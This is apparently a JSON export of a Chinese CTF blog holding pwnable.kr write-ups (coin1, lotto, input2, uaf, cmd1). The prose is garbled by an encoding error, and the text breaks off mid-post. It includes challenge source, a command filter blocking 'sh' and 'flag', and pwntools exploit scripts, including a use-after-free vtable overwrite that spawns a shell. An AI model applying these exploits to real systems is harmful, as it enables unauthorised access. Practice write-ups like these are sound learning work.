æ¥æ”¶","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr coin1","slug":"CTF/pwn/pwnable/pwnable.kr-coin1","date":"2021-07-14T04:44:16.840Z","updated":"2021-08-08T09:34:55.093Z","comments":true,"path":"7286/","link":"","permalink":"http://example.com/7286/","excerpt":"","text":"ncè¿ä¸Šå»çœ‹çœ‹ ä¸€ä¸ªæ‰¾å‡ç¡¬å¸æ¸¸æˆï¼Œå¤§æ¦‚æ„æ€ä¸ºï¼š Næ˜¯ç¡¬å¸ä¸ªæ•°ï¼ŒCæ˜¯è¾“å…¥æ¬¡æ•°ï¼Œè¾“å…¥ç›¸åº”çš„ç¡¬å¸ä¸‹æ ‡ä¼šç»™ä½ ç¡¬å¸çš„é‡é‡ï¼ˆå›¾ä¸­è¾“å…¥0ä»£è¡¨ç¬¬ä¸€ä¸ªç¡¬å¸ï¼Œ10æ˜¯ä¸€ä¸ªçœŸç¡¬å¸çš„é‡é‡ï¼Œè¾“å…¥0,1è¿”å›20ï¼Œä»£è¡¨ä¸¤ä¸ªçœŸç¡¬å¸çš„é‡é‡ï¼‰ å½“æ¬¡æ•°ç”¨å®Œæ—¶ï¼Œéœ€è¦è¾“å…¥å‡ç¡¬å¸å¯¹åº”çš„ä¸‹æ ‡ï¼Œ æ•´ç†å®Œè¿‡åå°±æ˜¯ä¸€ä¸ªé¢˜ç›®è€ƒå¯Ÿæˆ‘ä»¬çš„äºŒåˆ†æŸ¥æ‰¾èƒ½åŠ›ï¼Œå°±æ˜¯å†™ä»£ç èƒ½åŠ›ï¼Œä½†æ˜¯è¿™ä¸ªä»£ç æˆ‘è°ƒè¯•äº†ä¸€ä¼šå„¿ã€‚ã€‚ï¼ˆå¤ªèœäº†ï¼‰ğŸ˜” expè„šæœ¬é‡Œé¢ç”¨åˆ°äº†æ­£åˆ™è¡¨è¾¾å¼æ¥æå–å­—ç¬¦ä¸²ä¸­çš„æ•°å­—ï¼Œå‚è€ƒäº†è¿™ç¯‡æ–‡ç« ï¼ˆé“¾æ¥ï¼‰ å› ä¸ºé“¾æ¥çš„ç«¯å£åªå¼€æ”¾ä¸€åˆ†é’Ÿï¼Œæˆ‘è¿™å„¿ç½‘é€Ÿæœ‰é™ï¼Œå°±åœ¨pwnable.krçš„æœåŠ¡å™¨ä¸Šå»è¿è¡Œä»£ç äº† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *import redef MakeFlat(low, high): Flat = &#x27;&#x27; mid = (low + high) // 2 for i in range(low, mid): Flat += str(i) + &#x27; &#x27; #log.info(&#x27;[&#x27;+Flat+&#x27;]&#x27;) return Flatdef BinarySearch(n, c): low = 0 high = n correct = &#x27;&#x27; for i in range(c): mid = (low + high) // 2 flat = MakeFlat(low, high) sh.sendline(flat) p = sh.recv() #log.success(p) if int(p) == 9: correct = flat continue if int(p) &lt; (mid - low) * 10: high = mid elif int(p) == (mid - low) * 10: low = mid correct = str(high - 1) log.success(&#x27;correct index: &#x27; + correct) sh.sendline(correct) log.success(sh.recv())def N_C(): #sleep(3) Flat = sh.recv() log.info(Flat) ListOfNaC = map(int, re.findall(&#x27;\\d+&#x27;, Flat)) return ListOfNaCif __name__ == &quot;__main__&quot;: #context.log_level = &#x27;debug&#x27; sh = remote(&#x27;pwnable.kr&#x27;, 9007) sh.recvuntil(&#x27;\\t- Ready? starting in 3 sec... -\\n\\t\\n&#x27;) sleep(3) for i in range(100): _list = N_C() BinarySearch(_list[0], _list[1]) log.success(sh.recv()) sh.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr lotto","slug":"CTF/pwn/pwnable/pwnable.kr-lotto","date":"2021-07-14T04:44:16.840Z","updated":"2021-08-08T09:36:25.635Z","comments":true,"path":"33592/","link":"","permalink":"http://example.com/33592/","excerpt":"","text":"åˆ©ç”¨scpå‘½ä»¤ä»æœåŠ¡å™¨ä¸‹è½½æºç åˆ°æœ¬åœ° 1scp -P 2222 -r lotto@pwnable.kr: /home/lotto/ /home/fish ç¨‹åºæºä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;bad luck...\\n&quot;); &#125;&#125;void help()&#123; printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);&#125;int main(int argc, char* argv[])&#123; // menu unsigned int menu; while(1)&#123; printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu)&#123; case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; &#125; &#125; return 0;&#125; åœ¨æœ¬åœ°è¿è¡Œç¨‹åºäº†è§£è¿‡ç¨‹ï¼Œæ„Ÿè§‰ç›¸å½“äºä¸€ä¸ªçŒœæ•°æ¸¸æˆï¼Œåˆ†æç¨‹åºä»£ç  éšæœºæ•°123456789101112131415// generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); ä¸Šé¢ä»£ç æ„æ€ä¸ºç”Ÿæˆ6ä¸ªå°äºç­‰äº45çš„éšæœºæ•°ï¼Œåˆšå¼€å§‹æˆ‘ä¸€ä¸ªurandomå’Œrandomæ˜¯ä¸€æ ·çš„ä¼ªéšæœºæ•°ï¼Œä½†æˆ‘ç”¨cè¯­è¨€å†™äº†ä¸€ä¸ªç®€å•çš„ç¨‹åºåå‘ç°å¹¶ä¸ä¸€æ · 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main()&#123; int i; unsigned int lotto[6]; int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); read(fd, lotto, 6); for(i = 0; i &lt; 6; i++)&#123; printf(&quot;%d, &quot;,lotto[i] % 45 + 1); &#125; printf(&quot;\\n&quot;);&#125; ç”Ÿæˆ a.outæ–‡ä»¶åè¿è¡Œç»“æœ æ‰€ä»¥è¿™é“é¢˜å¹¶ä¸èƒ½ä½¿ç”¨ä¼ªéšæœºçš„ç‰¹æ€§æ¥åš æ£€æµ‹ç»§ç»­åˆ†æä¸‹é¢çš„æ£€æµ‹å‡½æ•° 12345678int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; è¿™æ®µä»£ç å¾ˆæœ‰æ„æ€ï¼Œæˆ‘çœ‹ç¬¬ä¸€éæ—¶æ²¡æƒ³é‚£ä¹ˆå¤šï¼Œåªæ˜¯æƒ³åˆ°äº†è¾“å…¥çš„6ä¸ªå­—èŠ‚çš„é¡ºåºä¸ä¸€å®šè¦å’Œlottoæ•°ç»„ä¸­çš„æ•°æ®é¡ºåºç›¸åŒï¼Œä½†æ˜¯åœ¨åé¢å‘ç°è¿™é‡Œé¢å­˜åœ¨ä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œè¿™æ²¡è€ƒè™‘æˆ‘ä»¬è¾“å…¥çš„6ä¸ªå­—èŠ‚å…¨æ˜¯ä¸€æ ·çš„æƒ…å†µï¼Œå¯ä»¥åˆ©ç”¨çˆ†ç ´ expè¿™é‡Œæ³¨æ„ä¸€ç‚¹ç»†èŠ‚æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—èŠ‚å¤§å°éœ€è¦å°äºç­‰äº45æ‰å¯ä»¥ 1234567891011121314151617from pwn import *#context.log_level = &#x27;debug&#x27;payload = b&#x27;######&#x27;sh = ssh(&#x27;lotto&#x27;, &#x27;pwnable.kr&#x27;, password = &#x27;guest&#x27;, port = 2222)p = sh.process(&#x27;./lotto&#x27;)while True: p.sendline(&#x27;1&#x27;) p.sendlineafter(&#x27;Submit your 6 lotto bytes : &#x27;,payload) msg = p.recv() if &#x27;bad luck&#x27; not in msg: sleep(3) log.success(msg) breakp.close()sh.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr input2","slug":"CTF/pwn/pwnable/pwnable.kr-input2","date":"2021-07-14T04:44:16.840Z","updated":"2021-08-08T09:35:14.030Z","comments":true,"path":"37476/","link":"","permalink":"http://example.com/37476/","excerpt":"","text":"readå‡½æ•°ä»æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„ç®¡é“å£è¯»å…¥æŒ‡å®šå­—èŠ‚çš„å­—ç¬¦ä¸²åˆ°æŒ‡å®šçš„æ•°ç»„ä¸­ writeå‡½æ•°ä»æŒ‡å®šçš„æ•°ç»„ä¸­å†™å…¥æŒ‡å®šæ•°é‡çš„å­—èŠ‚åˆ°æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„ç®¡é“å£ å¸¸è§çš„ ä¸‰ç§ 0ï¼Œ 1ï¼Œ 2 åˆ†åˆ«è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†é”™è¯¯ pipeå‡½æ•°dup&amp;dup2å‡½æ•° å¤åˆ¶ä¸€ä»½ç›¸åŒçš„æ–‡ä»¶æè¿°ç¬¦ forkå‡½æ•°åœ¨å½“å‰çˆ¶è¿›ç¨‹åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹è¿”å›å¾—fpid == 0 æ–‡ä»¶æè¿°ç¬¦ å®ä¾‹1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main()&#123; char buffer2[100]; char buffer[] = &quot;Let&#x27;s study pipe!&quot;; int fd[2]; pid_t fpid; pipe(fd); fpid = fork(); //printf(&quot;%d %d \\n&quot;, fd[0], fd[1]); if(fpid &lt; 0)&#123; perror(&quot;fork error\\n&quot;); &#125; else if(fpid &gt; 0)&#123; //çˆ¶è¿›ç¨‹ å‘ç®¡é“ä¸­å†™å…¥æ•°æ® close(fd[0]); write(fd[1], buffer, strlen(buffer) + 1); printf(&quot;father process input buffer in pipe success!\\n&quot;); &#125; else if(fpid == 0)&#123; //å­è¿›ç¨‹ ä»ç®¡é“ä¸­è¯»å‡ºæ•°æ® close(fd[1]); read(fd[0], buffer2, strlen(buffer) + 1); printf(&quot;son process output buffer in pipe success!\\n&quot;); printf(&quot;the buffer in pipe is %s\\n&quot;, buffer2); &#125; return 0;&#125; ä¸Šè¿°ä»£ç çš„ä½œç”¨ä½çˆ¶è¿›ç¨‹å°†bufferå­—ç¬¦ä¸²æ•°æ®å†™å…¥ç®¡é“ä¸­ï¼Œå­è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å…¥æ•°æ®åˆ°æ–°æ•°ç»„buffer2ä¸­ ç¼–è¯‘è¾“å‡ºå ç¼“å†²åŒºä¸‰ç§ç¼“å†² å…¨ç¼“å†²ï¼Œè¡Œç¼“å†²ï¼Œä¸ç¼“å†²","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr uaf","slug":"CTF/pwn/pwnable/pwnable..kr-uaf","date":"2021-07-14T04:44:16.830Z","updated":"2021-08-08T09:33:45.835Z","comments":true,"path":"32386/","link":"","permalink":"http://example.com/32386/","excerpt":"","text":"æºç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system(&quot;/bin/sh&quot;); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public:Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; Ues After Freeâ€‹ uafçš„åŸç†å…¶å®å¹¶ä¸éš¾æ‡‚ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªè¿·é€”æŒ‡é’ˆï¼Œä¹Ÿç§°ä¸ºé‡æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæ—¶å› ä¸ºåœ¨ä½¿ç”¨ç©åˆ†é…çš„å †ç©ºé—´åæ²¡æœ‰å°†æŒ‡å‘å †çš„æŒ‡é’ˆåˆ¶ç©ºé€ æˆçš„ï¼Œåˆ©ç”¨é‡æŒ‡é’ˆæˆ‘ä»¬å¯ä»¥å‘è¿™å—å †ä¸­å†™å…¥ä¸€äº›ä¸œè¥¿ï¼Œç„¶ååœ¨ç”³è¯·å †ç©ºé—´ï¼Œåœ¨é‡Šæ”¾å®Œåé©¬ä¸Šåˆç”³è¯·ä¼šç”³è¯·åˆ°é‚£æ®µåˆšåˆšé‡Šæ”¾çš„å †ç©ºé—´ã€‚ è¿™ä¸ªæ˜¯æœ€ç®€å•çš„uafç¨‹åº 123456789101112131415#include &lt;stdio.h&gt;int main()&#123; char *p0; p0=(char *)malloc(sizeof(char)*10); //æŒ‡é’ˆp0ç”³è¯·å†…å­˜ï¼› memcpy(p0,&quot;hello&quot;,10); printf(&quot;p0 Addr:%x,%s\\n&quot;,p0,p0); //æ‰“å°å…¶åœ°å€ä¸å€¼ï¼› free(p0); //é‡Šæ”¾p0ï¼› char *p1; p1==(char *)malloc(sizeof(char)*10); memcpy(p1,&quot;word&quot;,10); printf(&quot;p1 Addr:%x,%s\\n&quot;,p1,p0); return 0;&#125; C++çš„ä¸€äº›çŸ¥è¯†ç‚¹å¤šæ€â€‹ è¿™ä¸ªæ¦‚å¿µåœ¨åœ¨wikiä¸Šè§£é‡Šå¾—éå¸¸æŠ½è±¡ï¼Œä½†æ˜¯ä¸Šé¢çš„æºç å…¶å®æŒºé€‚åˆæˆ‘ä»¬ç†è§£çš„ï¼ŒManå’ŒWomanéƒ½ç»§æ‰¿äº†Personè¿™ä¸ªç±»ï¼Œintroduceè¿™ä¸ªåŠ¨ä½œæ˜¯æ‰€æœ‰äººéƒ½æœ‰çš„ï¼Œä½†æ˜¯ç»†åˆ†åˆ°Manå’ŒWomanæ—¶ä»–ä»¬ä¹‹é—´çš„introduceåˆä¸ä¸€æ ·äº†ï¼Œè¿™å°±æ˜¯å¤šæ€ã€‚ â€‹ æˆ‘çš„ç†è§£ä¸ºï¼Œåœ¨äºå‚è€ƒç³»çš„ä¸åŒï¼Œè¿™æ ·å°±å­˜åœ¨å®è§‚ä¸å¾®è§‚çš„åŒºåˆ«ã€‚ã€‚æ€ªå¼‚çš„ç†è§£ã€‚ è™šè¡¨â€‹ c++é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å¤šæ€æ€§éœ€è¦ç”±è™šè¡¨æ¥å®ç°ã€‚ â€‹ è™šè¡¨é€šä¿—æ¥è®²å°±æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„é‡Œé¢çš„æŒ‡é’ˆæŒ‡å‘äº†ç±»ä¸­çš„è™šå‡½æ•°ï¼Œä½†æ˜¯è™šå‡½æ•°è¡¨å¹¶ä¸å­˜æ”¾åœ¨ç±»ä¸­ï¼Œç±»ä¸­åªæœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘è™šå‡½æ•°è¡¨ã€‚è€Œåœ¨c++ä¸­åŒä¸€ä¸ªç±»çš„å¯¹è±¡å…±ç”¨ä¸€å¼ è™šè¡¨ã€‚ ç±»åœ¨å†…å­˜ä¸­çš„ç»“æ„12345678910111213+------------------------+ virtual talbe + virtual table pointer + ----&gt; +---------------+ +------------------------+ + func1 pointer + + characteristic _ 1 + + --------------++------------------------+ + func2 pointer ++ characteristic _ 2 + +---------------++------------------------+ + func3 pointer ++ characteristic _ 3 + +---------------++------------------------++ ........... ++------------------------++ characteristic _ n ++------------------------+ ç¨‹åºåˆ†æåˆ†æ ç¨‹åºå¼€å§‹ç”³è¯·äº†ä¸¤å—å†…å­˜ 12Human* m = new Man(&quot;Jack&quot;, 25);Human* w = new Woman(&quot;Jill&quot;, 21); ç”¨æˆ·é€‰æ‹©èœå•ï¼ˆ1.è°ƒç”¨æ–¹æ³•ã€‚2.ç”³è¯·å†…å­˜ï¼Œè¯»å…¥å‚æ•°ã€‚3.é‡Šæ”¾å†…å­˜ï¼‰ 12345678910111213141516switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break;&#125; å¯ä»¥å‘ç°ç¨‹åºæ²¡æœ‰å¯¹é‡Šæ”¾å†…å­˜åçš„æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨é‡æŒ‡é’ˆï¼Œè€Œé€‰æ‹©è€Œåˆå¯ä»¥ç”³è¯·å†…å­˜ï¼Œæ»¡è¶³UAFæ¼æ´çš„è§¦å‘æ¡ä»¶ã€‚åˆæ­¥çš„æƒ³æ³•å°±æ˜¯å…ˆ3åœ¨2ï¼ˆå…ˆé‡Šæ”¾åç”³è¯·ï¼‰ï¼Œåœ¨å‘ç”³è¯·çš„ç©ºé—´ä¸­å†™å…¥ä¸œè¥¿ï¼Œç°åœ¨çš„é—®é¢˜æ˜¯å†™ä»€ä¹ˆè¿›å»ã€‚é‡Šæ”¾çš„ç©ºé—´æ˜¯ç±»ï¼Œå†™å…¥çš„æ•°æ®æ”¹å˜çš„æ˜¯ç±»ï¼Œå¦‚æœç±»æœ‰è™šå‡½æ•°ï¼Œé‚£ä¹ˆç±»ç»“æ„çš„å¼€å¤´å°±æ˜¯è™šè¡¨æŒ‡é’ˆã€‚æˆ‘ä»¬æ”¹å˜çš„å°±æ˜¯è™šè¡¨æŒ‡é’ˆï¼Œæ”¹å˜è™šè¡¨æŒ‡é’ˆçš„ä½œç”¨å¯ä»¥é€šè¿‡IDAæŸ¥çœ‹åç¼–è¯‘ä»£ç æ¥å­¦ä¹  IDAåç¼–è¯‘æ¥ç†è§£è™šå‡½æ•°è¡¨è·Ÿè¸ªå˜é‡v12å’Œv13 ä¸‹é¢è¿™é‡Œæœ‰ç‚¹éš¾çœ‹æ‡‚ï¼Œå¦‚æŒ‡é’ˆæ²¡æœ‰å­¦å¥½çœ‹è¿™ç§ä¸€å®šä¼šçœ‹æ™•ã€‚æˆ‘å°½é‡å†™æ¸…æ¥šä¸€ç‚¹ é¦–å…ˆè¦æ˜ç™½v12,v13è¿™ä¸¤ä¸ªå˜é‡å­˜æ”¾çš„æ˜¯å¯¹è±¡è™šè¡¨çš„åœ°å€ï¼Œå› ä¸ºä¸¤ä¸ªå˜é‡ç±»å‹å’Œæ“ä½œæ–¹æ³•ä¸€æ ·ï¼Œæˆ‘åªè¯´v12å°±å¯ä»¥äº† å°†v12å¼ºè½¬æˆQWORD*ç±»å‹ï¼Œåœ¨å–è¿™ä¸ªåœ°å€ä¸­çš„å€¼ï¼ŒQWORDå 8ä¸ªå­—èŠ‚ï¼Œä¸€æ¬¡å–8ä½ï¼Œå–å‡ºçš„è¿™8ä½å°±æ˜¯è™šè¡¨çš„é¦–åœ°å€ è™šè¡¨é¦–åœ°å€åŠ +8ï¼Œä»£è¡¨å–è™šè¡¨ä¸­çš„ç¬¬äºŒä¸ªå‡½æ•°æŒ‡é’ˆ å°†å‡½æ•°æŒ‡é’ˆèµ‹å€¼ï¼Œåœ¨è°ƒç”¨ï¼Œå‚æ•°å°±æ˜¯å¯¹è±¡æœ¬èº«ï¼ˆthisæŒ‡é’ˆ)ï¼Œå¦‚æœä¸æ‡‚thisæŒ‡é’ˆå»Googleäº†è§£ä¸‹ï¼Œå¾ˆé‡è¦ã€‚ åˆ©ç”¨â€‹ é€šè¿‡ä¸Šé¢çš„åˆ†æï¼ŒçŸ¥é“äº†è°ƒç”¨è™šå‡½æ•°å…¶å®æ˜¯é€šè¿‡åç§»æ¥å®ç°çš„ï¼Œé€šè¿‡+8å¯ä»¥è°ƒç”¨ç¬¬äºŒä¸ªè™šå‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬å¾—åˆ°äº†è™šå‡½æ•°è¡¨åŸºå€ï¼Œå¹¶ä¸”æ”¹å˜ï¼Œå°±å¯ä»¥æ§åˆ¶å‡½æ•°è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„è™šå‡½æ•°ï¼Œè€Œç¨‹åºä¸ºæˆ‘ä»¬å‡†å¤‡äº†è¿™æ ·ä¸€ä¸ªè™šå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ 123virtual void give_shell()&#123; system(&quot;/bin/sh&quot;);&#125; é€šè¿‡IDAæŸ¥æ‰¾åˆ°Personå‡½æ•°çš„è™šè¡¨åœ°å€æ˜¯0x0000000000401590ï¼Œå°†è¿™ä¸ªå€¼-8ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨çš„æ—¶å€™å°±åˆšå¥½å¯ä»¥è°ƒç”¨åˆ°give_shellè¿™ä¸ªå‡½æ•° 123456789101112131415161718# æœ¬æœºexpï¼Œè¿œç¨‹å¤±è´¥å¥½åƒæ˜¯æˆ‘æ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™ï¼Ÿfrom pwn import *vtable_addr = 0x0000000000401550filepath = &#x27;/home/fish/uaf/bash&#x27;#filepath = &#x27;/tmp/f1sh&#x27;write_stream = p64(vtable_addr - 8)with open(filepath, &#x27;wb&#x27;) as fp: fp.write(write_stream)Argv = [&#x27;/home/uaf/uaf&#x27;, &#x27;8&#x27;, filepath]p = process(executable = &#x27;./uaf&#x27;, argv = Argv )p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;3&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;2&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;2&#x27;)p.sendlineafter(&#x27;1. use\\n2. after\\n3. free\\n&#x27;, &#x27;1&#x27;)p.interactive() è¿™ä¸ªæ˜¯é“¾æ¥ä¸ŠæœåŠ¡å™¨åæ‰‹åŠ¨getshellå¾—åˆ°çš„ç»“æœ","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"pwn","slug":"CTF/pwn","permalink":"http://example.com/categories/CTF/pwn/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","permalink":"http://example.com/categories/CTF/pwn/pwnable-kr/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr cmd1 cmd2","slug":"CTF/pwn/pwnable/pwnable.kr cmd1 cmd2","date":"2021-07-14T04:44:16.830Z","updated":"2021-08-08T09:34:24.640Z","comments":true,"path":"46930/","link":"","permalink":"http://example.com/46930/","excerpt":"","text":"cmd1linuxPATHå…¥é—¨æ•™å­¦linuxå‘½ä»¤é€šé…ç¬¦putenvå‡½æ•°è®²è§£ è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯å¯¹äºlinuxä¸­shellçš„æ“ä½œï¼Œè¿˜æœ‰PATHç¯å¢ƒçŸ¥è¯†çš„ç†è§£ã€‚æˆ‘å‚è€ƒäº†ä¸Šé¢ä¸‰ç¯‡æ–‡ç« ï¼Œéƒ½å†™å¾—å¾ˆä¸é”™ğŸ‘ã€‚è¿™é‡Œæˆ‘å†™ä¸¤ç§è§£å†³æ–¹æ³• method 1é¦–å…ˆsshç™»å½•ï¼ŒæŸ¥çœ‹æºç  12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;flag&quot;)!=0; r += strstr(cmd, &quot;sh&quot;)!=0; r += strstr(cmd, &quot;tmp&quot;)!=0; return r;&#125;int main(int argc, char* argv[], char** envp)&#123; putenv(&quot;PATH=/thankyouverymuch&quot;); printf(&quot;%s\\n&quot;,getenv(&quot;PATH&quot;)); system(&quot;ls&quot;); if(filter(argv[1])) return 0; system( argv[1] ); return 0;&#125; ç¨‹åºå°†PATHç¯å¢ƒè®¾ç½®æˆäº†ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„å¯¼è‡´ä¸èƒ½ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼Œè€Œä¸”filterå‡½æ•°è¿‡æ»¤æ‰äº†æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›å­—ç¬¦ã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆæ¥æµ‹è¯•ä¸€ä¸‹PATHå¦‚æœè¢«æ”¹å˜ä¼šæ€ä¹ˆæ 